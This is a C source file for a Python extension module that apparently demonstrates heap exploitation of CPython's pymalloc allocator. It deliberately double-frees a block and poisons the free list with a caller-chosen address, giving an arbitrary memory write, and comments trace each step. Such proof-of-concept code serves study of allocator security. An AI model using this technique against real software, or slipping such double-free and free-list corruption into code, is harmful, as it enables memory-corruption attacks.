#include <stdio.h>
#include <Python.h>


static PyObject * test_wrapper(PyObject * self, PyObject * args)
{
  size_t n = 512-8;
  unsigned long long target;
  int val;
  void * p1_again;
  void * p_target;

  void * p1 = PyObject_Malloc(n);
  void * p2 = PyObject_Malloc(n);
  void * p3 = PyObject_Malloc(n);
  void * p4 = PyObject_Malloc(n);
  printf("p1: %p\np2: %p\np3: %p\n", p1, p2, p3);

  // get arguments, 1st argument is the address target, 2nd is the value to write on it
  if (!PyArg_ParseTuple(args, "Ki", &target, &val))
    return NULL;

  // first free p2
  PyObject_Free(p2);
  // pool->ref.count=3; pool_header->freeblock = p2;

  // double free
  PyObject_Free(p1);
  // pool->ref.count=2; pool_header->freeblock = p1; p1->next=p2;
  PyObject_Free(p1);
  // pool->ref.count=1; pool_header->freeblock = p1; p1->next=p1;  corrupted

  // get p1 back
  p1 = PyObject_Malloc(n);
  // pool->ref.count=2; pool_header->freeblock = p1; p1->next=p1;

  // corrupt p1 to corrupt block free list
  *(unsigned long long *)p1 = target;
  // pool->ref.count=2; pool_header->freeblock = p1; p1->next=target;

  p1_again = PyObject_Malloc(n);
  // pool->ref.count=3; pool_header->freeblock = target;

  p_target = PyObject_Malloc(n);
  // pool->ref.count=4;

  *(int *)p_target = val;

  printf("p1: %p\np1_again: %p\n", p1, p1_again);
  printf("p_target: *(%p) == %d\n", p_target, (int *)p_target);

  PyObject * ret;
  ret = Py_BuildValue("i",0);
  return ret;
}

static PyMethodDef HelloMethods[] = {
 { "test_free_method", (PyCFunction)test_wrapper, METH_VARARGS},
 { NULL, NULL, 0, NULL }
};

static struct PyModuleDef testfreePyDem =
{
  PyModuleDef_HEAD_INIT,
  "testfree", /* name of module */
  "",          /* module documentation, may be NULL */
  -1,          /* size of per-interpreter state of the module, or -1 if the module keeps state in global variables. */
  HelloMethods
};

PyMODINIT_FUNC PyInit_testfree(void) {
  return PyModule_Create(&testfreePyDem);
}
